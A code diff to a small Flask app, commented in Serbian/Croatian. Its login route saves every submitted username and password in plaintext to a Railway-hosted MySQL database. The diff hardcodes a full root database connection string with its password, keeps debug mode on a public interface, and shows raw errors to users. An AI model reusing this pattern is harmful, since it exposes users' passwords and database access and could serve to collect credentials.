@@ -1,3 +1,4 @@
+import os
 from flask import Flask, render_template, request, redirect, url_for, flash
 from sqlalchemy import create_engine, text
 from sqlalchemy.orm import sessionmaker
@@ -5,15 +6,13 @@ from sqlalchemy.orm import sessionmaker
 app = Flask(__name__)
 app.secret_key = "your_secret_key"
 
-# Podesi konekciju za Railway MySQL bazu
+# Povezivanje s bazom (MySQL na Railway)
 DATABASE_URL = "mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway"
-
-# Povezivanje sa bazom
-engine = create_engine(DATABASE_URL, pool_pre_ping=True)
+engine = create_engine(DATABASE_URL)
 Session = sessionmaker(bind=engine)
 session = Session()
 
-# Provera konekcije pri pokretanju
+# Provera konekcije
 try:
     with engine.connect() as connection:
         connection.execute(text("SELECT 1"))
@@ -26,31 +25,29 @@ except Exception as e:
 def index():
     return render_template('index.html')
 
-# Login ruta
+# Ruta za prijavu
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    if not username or not password:
-        flash("Molimo unesite oba polja!", "error")
-        return redirect(url_for('index'))
-
     try:
-        with engine.begin() as connection:  # begin() automatski radi commit
+        with engine.connect() as connection:
+            # Ubacivanje login pokušaja u bazu
             insert_query = text("""
                 INSERT INTO login_attempt (username, password, attempt_time) 
                 VALUES (:username, :password, NOW())
             """)
             connection.execute(insert_query, {"username": username, "password": password})
 
-        flash('✅ Login attempt saved to database!', 'success')
-        return redirect(url_for('index'))
+            flash('Login attempt saved to database!', 'success')
+            return redirect(url_for('index'))
 
     except Exception as e:
-        print(f"❌ Greška pri prijavljivanju: {e}")  # Railway logs
-        flash(f'Greška pri prijavljivanju!', 'error')
+        flash(f'Greška pri prijavljivanju: {e}', 'error')
         return redirect(url_for('index'))
 
+# Pokretanje servera na Railway portu (8080)
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=10000, debug=True)  # Debug mode omogućen
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port, debug=True)
